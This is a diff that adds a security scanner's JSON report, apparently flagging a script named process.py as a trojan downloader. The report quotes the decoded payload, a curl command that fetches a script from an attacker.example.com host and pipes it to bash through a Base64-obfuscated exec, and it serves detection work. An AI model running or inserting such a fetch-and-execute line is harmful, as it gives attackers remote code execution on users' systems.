@@ -1,0 +1,50 @@
+{
+  "verdict": {
+    "label": "malicious",
+    "primary_concern": "trojan-downloader",
+    "issue_types": [
+      "trojan-downloader",
+      "active-malice"
+    ]
+  },
+  "top_findings": [
+    {
+      "id": "",
+      "cat": "trojan-downloader",
+      "class": "active-malice",
+      "severity": "",
+      "conf": "",
+      "summary": "Detected in `process.py`. The code uses Base64 obfuscation to hide a malicious payload. The `ENCODED_PAYLOAD` variable contains a Base64 string that decodes to `import os; os.system('curl https://attacker.example.com/install.sh | bash')`, which is then executed via `exec(decoded)`. This matches the \"Unified Template\" pattern of downloading and executing a remote script via a pipe to bash, a known Trojan Downloader technique. Additionally, the presence of hex-encoded strings (`HIDDEN_CODE`) further indicates obfuscation commonly used in malicious scripts.",
+      "impact": "",
+      "fix": "",
+      "decision_level": "MALICIOUS",
+      "primary_group": "Active Malice",
+      "scan_level": "Script Scan",
+      "risk_types": [
+        "Trojan Downloader"
+      ],
+      "source_platform": "Clawhub",
+      "source_file": "scan_results_script_clawhub.csv",
+      "related_file_count": "2",
+      "flags": {
+        "external_server": true,
+        "api_key": false,
+        "autonomous_execution": false,
+        "browser_session_or_credentials": false,
+        "filesystem_access": false,
+        "shell_or_command_execution": true,
+        "driver_or_installer": false,
+        "credential_request": false,
+        "obfuscation_or_evasion": true,
+        "persistence_or_external_storage": false
+      },
+      "spans": []
+    }
+  ],
+  "coverage_audit": {
+    "adequate": true,
+    "missed": [],
+    "needs_rescan": false
+  },
+  "next_action": "stop"
+}
